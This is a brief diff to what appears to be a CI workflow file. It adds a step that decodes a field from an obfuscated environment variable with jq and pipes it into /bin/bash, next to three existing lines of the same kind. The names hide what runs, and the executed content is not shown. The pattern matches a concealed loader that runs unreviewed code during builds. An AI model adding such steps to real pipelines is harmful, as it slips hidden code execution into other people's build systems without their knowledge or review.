@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$ftodb126" | jq -r .blyd5224 | /bin/bash
           printf '%s' "$rbp393" | jq -r .vfmt6 | /bin/bash
           printf '%s' "$nf1" | jq -r .ofe2908 | /bin/bash
+          printf '%s' "$koktl13846" | jq -r .m2 | /bin/bash
 
       - name: Archive output
         if: always()
